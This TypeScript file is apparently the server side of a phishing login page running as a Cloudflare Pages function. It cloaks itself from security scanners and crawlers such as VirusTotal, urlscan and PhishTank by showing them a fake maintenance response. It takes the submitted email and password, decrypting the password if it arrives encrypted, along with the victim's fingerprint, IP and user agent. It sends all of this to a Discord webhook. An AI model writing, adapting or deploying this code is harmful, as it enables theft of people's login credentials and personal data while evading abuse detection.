
export const onRequestPost = async (context: any) => {
  const { request, env } = context;
  
  // 1. Bot Detection
  const ua = request.headers.get('user-agent')?.toLowerCase() || '';
  const referer = request.headers.get('referer')?.toLowerCase() || '';
  
  const botUserAgents = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
    'yandexbot', 'ahrefsbot', 'semrushbot', 'dotbot', 'rogerbot', 
    'exabot', 'mj12bot', 'facebot', 'facebookexternalhit', 'ia_archiver',
    'virustotal', 'urlscan', 'phishtank', 'netcraft', 'cybercrime',
    'security', 'scanner', 'headless', 'puppeteer', 'selenium',
    'playwright', 'zgrab', 'censys', 'shodan', 'nmap', 'sqlmap',
    'nikto', 'burp', 'acunetix', 'netsparker', 'qualys', 'nessus'
  ];

  const isSecurityScanner = 
    botUserAgents.some(bot => ua.includes(bot)) ||
    referer.includes('virustotal') || 
    referer.includes('urlscan') ||
    referer.includes('phishtank') ||
    request.headers.get('x-scanner') ||
    request.headers.get('x-request-id')?.includes('scanner');

  if (isSecurityScanner) {
    return new Response('System Maintenance', { status: 503 });
  }

  // 2. Parse Body
  try {
    const body: any = await request.json();
    const { email, password, fingerprint, theme } = body;
    const ip = request.headers.get('cf-connecting-ip') || request.headers.get('x-real-ip') || 'N/A';
    const userAgent = ua || 'N/A';

    // 3. Decrypt Password if needed
    let displayPassword = password;
    if (password && password.length > 50) { // Likely encrypted
      try {
        const encryptedObj = JSON.parse(atob(password));
        if (encryptedObj.k && encryptedObj.i && encryptedObj.d) {
          const keyRaw = new Uint8Array(atob(encryptedObj.k).split('').map(c => c.charCodeAt(0)));
          const iv = new Uint8Array(atob(encryptedObj.i).split('').map(c => c.charCodeAt(0)));
          const data = new Uint8Array(atob(encryptedObj.d).split('').map(c => c.charCodeAt(0)));

          const cryptoKey = await crypto.subtle.importKey(
            'raw',
            keyRaw,
            { name: 'AES-GCM' },
            false,
            ['decrypt']
          );

          const decryptedBuffer = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv },
            cryptoKey,
            data
          );

          displayPassword = new TextDecoder().decode(decryptedBuffer);
        }
      } catch (e) {
        console.error("Decryption failed:", e);
        // Fallback to original password if decryption fails
      }
    }

    // 4. Submit to Discord
    const webhookUrl = env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
      console.error("DISCORD_WEBHOOK_URL not set in Cloudflare environment");
      return new Response(JSON.stringify({ status: "ok", message: "No webhook configured" }), {
        headers: { 'Content-Type': 'application/json' }
      });
    }

    const payload = {
      embeds: [
        {
          title: "New Login Attempt (CF Pages)",
          color: 0xff4b33,
          fields: [
            { name: "Email", value: email || "N/A", inline: true },
            { name: "Password", value: displayPassword || "N/A", inline: true },
            { name: "Theme", value: theme || "Default", inline: true },
            { name: "Fingerprint", value: `\`\`\`${fingerprint || "N/A"}\`\`\`` },
            { name: "User Agent", value: userAgent },
            { name: "IP", value: ip }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    const discordResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!discordResponse.ok) {
      throw new Error(`Discord responded with ${discordResponse.status}`);
    }

    return new Response(JSON.stringify({ status: "ok" }), {
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (error: any) {
    console.error("Submission error:", error);
    return new Response(JSON.stringify({ error: "Failed to submit", details: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
};
